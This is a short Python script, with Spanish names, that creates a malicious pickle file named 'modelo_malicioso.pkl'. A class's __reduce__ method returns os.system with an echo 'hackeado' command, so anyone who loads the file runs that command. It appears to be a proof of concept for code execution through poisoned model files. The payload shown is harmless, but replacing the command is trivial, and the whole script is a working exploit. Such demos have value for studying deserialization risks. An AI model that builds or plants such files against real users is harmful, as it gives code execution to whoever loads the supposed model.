import pickle
import os

class Malicioso:
    def __reduce__(self):
        return (os.system, ('echo "hackeado"',))

with open('modelo_malicioso.pkl', 'wb') as f:
    pickle.dump(Malicioso(), f)

print("Archivo modelo_malicioso.pkl creado.")